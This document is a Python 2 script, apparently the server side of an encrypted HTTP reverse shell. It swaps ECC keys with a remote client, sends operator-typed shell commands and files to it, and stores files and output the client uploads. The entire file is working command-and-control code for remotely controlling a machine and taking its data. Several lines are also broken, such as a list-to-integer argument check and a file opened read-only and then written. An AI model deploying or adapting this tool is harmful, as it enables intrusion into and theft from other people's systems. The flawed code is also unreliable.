#!/usr/bin/python

import BaseHTTPServer
import cgi, os
import CryptoWrapper
import sys
crypto = CryptoWrapper.CryptoWrapper()

eccPrivateKey, eccPublicKey, eccCurve = crypto.eccGenerate()

if sys.argv < 2:
    print 'Usage: ./reverse-server-http.py <port-number>'
    print 'You must have the CryptoWrapper library installed'
    print 'pip install CryptoWrapper'
    sys.exit(0)
host = '0.0.0.0'
port = sys.argv[1]

client_pubkey = ''

class myhandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def encrypt_message(s, message):
        print client_pubkey
        s.encryptedECCContent = crypto.eccEncrypt(client_pubkey, eccCurve, message)

        return s.encryptedECCContent

    def decrypt_message(s, message):

        s.decryptedECCContent = crypto.eccDecrypt(eccPrivateKey, eccCurve, message)

        return s.decryptedECCContent

    def do_GET(s):
        if s.path == '/connect':
            s.send_response(200)
            s.send_header('Content-type', 'text/html')
            s.end_headers()
            s.wfile.write(eccPublicKey)
            print('envio sucedido')
            return
        if s.path == '/file':
                s.send_response(200)
                s.send_header('Content-type','text/html')
                s.end_headers()
                arq = raw_input("qual arquivo deseja enviar?")
                file = open(arq,'rb')
                s.wfile.write(s.encrypt_message(file.read()))
                print('envio sucedido')
                return

        comand = raw_input('Shell>')
        s.send_response(200)
        s.send_header('Content-type','text/html')
        s.end_headers()
        s.wfile.write(s.encrypt_message(comand))

    def do_POST(s):
        global client_pubkey

        if s.path == '/connect':
            s.send_response(200)
            s.end_headers()
            length = int(s.headers['Content-Length'])
            client_pubkey = s.rfile.read(length)
            return

        if s.path == '/store':
            try:
                ctype,pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp = s.rfile, headers = s.headers, environ={'REQUEST_METHOD':'POST'})
                else:
                    print '[-] Unexpected POST request'

                fs_up = fs['file']

                with open('/root/Desktop/1.txt','wb') as o:
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print e
            return

        if '/file' in s.path:
            try:
                ctype,pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp = s.rfile, headers = s.headers, environ={'REQUEST_METHOD':'POST'})
                else:
                    print '[-] Unexpected POST request'

                fs_up = fs['file']

                with open('/root/Desktop/1.txt','rb') as o:
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print e
            return

        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        text = s.rfile.read(length)
        print (text)


if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer

    httpd = server_class((host,port),myhandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
